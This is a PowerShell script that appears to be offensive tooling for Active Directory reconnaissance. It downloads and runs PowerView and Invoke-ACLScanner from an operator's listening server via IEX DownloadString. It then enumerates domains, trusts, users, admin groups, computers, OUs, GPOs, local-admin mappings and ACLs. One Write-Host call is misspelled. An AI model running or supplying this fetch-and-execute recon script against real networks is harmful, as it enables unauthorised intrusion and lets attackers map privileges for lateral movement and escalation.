function Invoke-PowerADRecon {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainController,

        [Parameter(Mandatory=$true)]
        [string]$ListeningServer
    )

  Write-Host "Importing Tooling" 

  IEX(New-Object Net.WebClient).DownloadString("$ListeningServer/PowerSploit/Recon/PowerView.ps1")
  IEX(New-Object Net.WebClient).DownloadString("$ListeningServer/Invoke-ACLScanner.ps1")
    
  Write-Host "Starting AD Recon on domain $Domain using domain controller $DomainController"
  
  Write-Host "Domain Information"
  Get-Domain -Domain $Domain -DomainController $DomainController
  Write-Host "-------------------------------------------------"

  Write-Host "Domain Controller"
  Get-DomainController -Domain $Domain -DomainController $DomainController | select Forest, Name, OSVersion | fl
  Write-Host "-------------------------------------------------"
   
  Write-Host "Domain Forests"
  Get-ForestDomain -DomainController $DomainController 
  Get-DomainTrustMapping -DomainController $DomainController 
  nltest /domain_trusts /server:$DomainController
  Write-Host "-------------------------------------------------"

  Write-Host "Domain Users"
  Get-DomainUser -Domain $Domain -DomainController $DomainController -Properties DisplayName, MemberOf | fl
  Write-Host "-------------------------------------------------"
  
  Write-Host "Domain Groups"
  Get-DomainGroup -Domain $Domain -DomainController $DomainController |  select SamAccountName
  Write-Host "Groups Containing the work Admin"
  Get-DomainGroup -Domain $Domain -DomainController $DomainController | where Name -like "*Admins*" | select SamAccountName
  Write-Host "-------------------------------------------------"
  
  rite-Host "Domain Computers"
  Get-DomainComputer -Properties DnsHostName -Domain $Domain -DomainController $DomainController | sort -Property DnsHostName
  Write-Host "-------------------------------------------------"

  Write-Host "Domain OUs"
  Get-DomainOU -Properties Name -Domain $Domain -DomainController $DomainController | sort -Property Name
  Get-DomainOU -Properties distinguishedname -DomainController $DomainController -Domain $Domain | sort -Property distinguishedname
  $OUs = Get-DomainOU -Properties distinguishedname -DomainController $DomainController -Domain $Domain | Sort-Object -Property distinguishedname
  foreach ($OU in $OUs) {
                $ouDistinguishedName = $OU.distinguishedname
                Write-Host "Enumerating Users, Computers, Groups associated with: $ouDistinguishedName"
                
                Write-Host "`nComputers Associated with $OU :`n"
                # Retrieving computers for each OU
                Get-DomainComputer -SearchBase $ouDistinguishedName -DomainController $DomainController -Domain $Domain | Select-Object dnsHostName
                
                Write-Host "`nUsers Associated with $OU :`n"
                # Retrieving users for each OU
                Get-DomainUser -SearchBase $ouDistinguishedName -DomainController $DomainController -Domain $Domain | Select-Object name

                Write-Host "`nGroups Associated with $OU :`n"
                Get-DomainGroup -SearchBase $ouDistinguishedName -DomainController $DomainController -Domain $Domain -Properties DnsHostName | sort -Property DnsHostName

               Write-Host "-------------------------------------------------"
                        }
  Write-Host "-------------------------------------------------"

  Write-Host "Domain GPOs"
  Get-DomainGPO -Properties DisplayName -Domain $Domain -DomainController $DomainController | sort -Property DisplayName

  Write-Host "Domain GPO Mapping"
  Get-DomainGPOLocalGroup -Domain $Domain -DomainController $DomainController | select GPODisplayName, GroupName
  Write-Host "-------------------------------------------------"

  Write-Host "Enumerates Machines where a domain or group has local administrative rights" 
  Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators -Domain $Domain -DomainController $DomainController | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

  Invoke-ACLScanner -Domain $Domain -DomainController $DomainController
  
}
